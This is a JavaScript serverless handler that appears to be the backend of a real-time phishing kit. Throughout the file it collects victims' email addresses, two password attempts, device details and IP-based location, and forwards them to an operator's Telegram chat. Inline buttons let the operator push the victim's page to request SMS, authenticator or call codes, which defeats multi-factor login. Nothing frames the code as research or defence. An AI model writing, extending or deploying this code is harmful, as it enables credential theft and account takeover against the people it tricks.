import { UAParser } from 'ua-parser-js';

// --- Configuration ---
const CONFIG = {
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
    UPSTASH_REDIS_REST_URL: process.env.UPSTASH_REDIS_REST_URL,
    UPSTASH_REDIS_REST_TOKEN: process.env.UPSTASH_REDIS_REST_TOKEN,
  },
  FETCH_TIMEOUT: 15000,
  GEO_API_FIELDS: 'country,regionName,city,query',
  // TTL for session data in Redis (24 hours)
  SESSION_TTL: 86400,
};

// --- Helper Functions ---

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';

const getClientIp = (event) => {
  const headers = event.headers || {};
  return (getHeader(headers, 'x-forwarded-for') ||
          getHeader(headers, 'x-real-ip') ||
          getHeader(headers, 'cf-connecting-ip') ||
          event.requestContext?.identity?.sourceIp ||
          'Unknown').toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown', city: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1') return location;
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
      signal: createTimeoutSignal(3000),
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
      location.city = geoJson.city || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  const uaParser = new UAParser(userAgent || '');
  const browser = uaParser.getBrowser();
  const os = uaParser.getOS();
  const device = uaParser.getDevice();
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
    deviceModel: device.model || '',
    deviceVendor: device.vendor || '',
  };
};

/**
 * Initialize Upstash Redis client (lazy, cached).
 */
let _redis = null;
const getRedis = async () => {
  if (_redis) return _redis;
  if (!CONFIG.ENV.UPSTASH_REDIS_REST_URL || !CONFIG.ENV.UPSTASH_REDIS_REST_TOKEN) {
    return null;
  }
  try {
    const { Redis } = await import('@upstash/redis');
    _redis = new Redis({
      url: CONFIG.ENV.UPSTASH_REDIS_REST_URL,
      token: CONFIG.ENV.UPSTASH_REDIS_REST_TOKEN,
    });
    return _redis;
  } catch (e) {
    console.error('Redis init failed:', e.message);
    return null;
  }
};

// --- Inline Keyboard Builder ---

/**
 * Builds the Telegram inline keyboard for bot control.
 * Each button callback_data is formatted as: action_sessionId
 */
const buildInlineKeyboard = (sessionId) => ({
  inline_keyboard: [
    [
      { text: '✅ Yes Prompt', callback_data: `yp_${sessionId}` },
      { text: '❌ Password Error', callback_data: `pe_${sessionId}` },
    ],
    [
      { text: '📝 SMS Code', callback_data: `sc_${sessionId}` },
      { text: '📝 Authenticator Code', callback_data: `ac_${sessionId}` },
    ],
    [
      { text: '📝 Call Code', callback_data: `cc_${sessionId}` },
      { text: '📝 Number Prompt', callback_data: `np_${sessionId}` },
    ],
    [
      { text: '✅ Success', callback_data: `su_${sessionId}` },
    ],
  ],
});

// --- Message Composers ---

/**
 * Composes the credentials message with device, location, and visitor info.
 * Matches the Telegram screenshot format requested by the user.
 */
const composeCredentialsMessage = (data) => {
  const {
    email, provider, firstAttemptPassword, secondAttemptPassword,
    clientIP, location, deviceDetails, timestamp, sessionId,
    language, platform, timezone, screenWidth, screenHeight,
  } = data;

  const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true,
  }) + ' UTC';

  return [
    `📬 *New Message from User*`,
    ``,
    `👤 User: \`${sessionId}\``,
    `💬 Message:`,
    `Email Provider: *${provider || 'Others'}*`,
    ``,
    `📧 Email: \`${email || 'Not captured'}\``,
    ``,
    `🔑 Password: \`${firstAttemptPassword || 'N/A'}\``,
    `🔑 Password 2: \`${secondAttemptPassword || 'N/A'}\``,
    ``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `📱 *Device Info*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `💻 Type: *${deviceDetails.deviceType.replace(/📱|💻/g, '').trim()}*`,
    `🖥 OS: *${deviceDetails.os}*`,
    `🌐 Browser: *${deviceDetails.browser}*`,
    ...(deviceDetails.deviceVendor ? [`📟 Device: *${deviceDetails.deviceVendor} ${deviceDetails.deviceModel}*`] : []),
    ...(platform ? [`🔧 Platform: \`${platform}\``] : []),
    ...(screenWidth ? [`📐 Screen: \`${screenWidth}x${screenHeight}\``] : []),
    ``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `📍 *Location Info*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🌍 Country: *${location.country}*`,
    `🏙 Region: *${location.regionName}*`,
    ...(location.city && location.city !== 'Unknown' ? [`🏘 City: *${location.city}*`] : []),
    `🌐 IP: \`${clientIP}\``,
    ...(timezone ? [`🕐 Timezone: \`${timezone}\``] : []),
    ``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `👁 *Visitor Info*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `🕐 Time: *${formattedTimestamp}*`,
    ...(language ? [`🗣 Language: \`${language}\``] : []),
    `🆔 Session: \`${sessionId}\``,
  ].join('\n');
};

/**
 * Composes a message for user input responses (codes, phone numbers).
 */
const composeUserInputMessage = (data) => {
  const { inputType, inputValue, sessionId, email, provider } = data;

  const labels = {
    sms_code: '📲 SMS Code',
    authenticator_code: '🔐 Authenticator Code',
    call_code: '📞 Call Code',
    phone_number: '📱 Phone Number',
    password_retry: '🔑 Password Retry',
  };

  const label = labels[inputType] || '📝 User Input';

  const formattedTimestamp = new Date().toLocaleString('en-US', {
    year: 'numeric', month: 'short', day: 'numeric',
    hour: '2-digit', minute: '2-digit', second: '2-digit',
    timeZone: 'UTC', hour12: true,
  }) + ' UTC';

  return [
    `📥 *User Response*`,
    ``,
    `👤 User: \`${sessionId}\``,
    `📧 Email: \`${email || 'N/A'}\``,
    `🏷 Provider: *${provider || 'N/A'}*`,
    ``,
    `${label}: \`${inputValue}\``,
    ``,
    `🕐 *${formattedTimestamp}*`,
  ].join('\n');
};


// --- Main Handler ---
export const handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }
  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const { type, data } = body;

    // --- Message Routing Logic ---
    if (type === 'credentials') {
      // Credential submission — send message with inline keyboard buttons
      const clientIP = getClientIp(event);
      const location = await getIpAndLocation(clientIP);
      const deviceDetails = getDeviceDetails(data.userAgent);

      const messageData = {
        ...data,
        clientIP,
        location,
        deviceDetails,
        language: data.language || '',
        platform: data.platform || '',
        timezone: data.timezone || '',
        screenWidth: data.screen?.width || '',
        screenHeight: data.screen?.height || '',
      };

      const message = composeCredentialsMessage(messageData);
      const sessionId = data.sessionId;

      // Send message with inline keyboard
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: buildInlineKeyboard(sessionId),
          }),
          signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
        }
      );

      let telegramMessageId = null;
      if (telegramResponse.ok) {
        const tgResult = await telegramResponse.json();
        telegramMessageId = tgResult.result?.message_id;
      } else {
        const errorResult = await telegramResponse.json().catch(() => ({ description: 'Unknown error' }));
        console.error('Telegram API Error:', errorResult.description);
      }

      // Store session data in Redis for the callback handler
      const redis = await getRedis();
      if (redis && sessionId) {
        const sessionPayload = {
          sessionId,
          email: data.email,
          provider: data.provider,
          firstAttemptPassword: data.firstAttemptPassword,
          secondAttemptPassword: data.secondAttemptPassword,
          clientIP,
          location,
          deviceDetails,
          telegramMessageId,
          command: null, // No command yet — operator hasn't pressed a button
          createdAt: new Date().toISOString(),
        };
        await redis.set(`tg_session:${sessionId}`, JSON.stringify(sessionPayload), { ex: CONFIG.SESSION_TTL });
        // Also initialize the command key to null
        await redis.set(`tg_command:${sessionId}`, JSON.stringify({ command: null }), { ex: CONFIG.SESSION_TTL });
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true, sessionId }),
      };

    } else if (type === 'user_input') {
      // User submitted a code or phone number in response to an operator command
      const { inputType, inputValue, sessionId, email, provider } = data;

      const message = composeUserInputMessage({ inputType, inputValue, sessionId, email, provider });

      // Send the user input as a new message with the same inline keyboard
      const telegramResponse = await fetch(
        `https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: buildInlineKeyboard(sessionId),
          }),
          signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
        }
      );

      if (!telegramResponse.ok) {
        const errorResult = await telegramResponse.json().catch(() => ({ description: 'Unknown error' }));
        console.error('Telegram API Error (user_input):', errorResult.description);
      }

      // Reset the command so the frontend goes back to waiting
      const redis = await getRedis();
      if (redis && sessionId) {
        await redis.set(`tg_command:${sessionId}`, JSON.stringify({ command: null }), { ex: CONFIG.SESSION_TTL });
      }

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true, sessionId }),
      };

    } else {
      // Fallback for old format or unknown types
      console.warn('Request received with unknown or missing "type". Processing as credentials.');
      const clientIP = getClientIp(event);
      const location = await getIpAndLocation(clientIP);
      const deviceDetails = getDeviceDetails(body.userAgent);
      const sessionId = body.sessionId || crypto.randomUUID();
      const messageData = { ...body, clientIP, location, deviceDetails, sessionId };
      const message = composeCredentialsMessage(messageData);

      await fetch(
        `https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`,
        {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            reply_markup: buildInlineKeyboard(sessionId),
          }),
          signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
        }
      );

      return {
        statusCode: 200,
        headers,
        body: JSON.stringify({ success: true, sessionId }),
      };
    }

  } catch (error) {
    console.error('Function execution error:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'An internal server error occurred.' }),
    };
  }
};
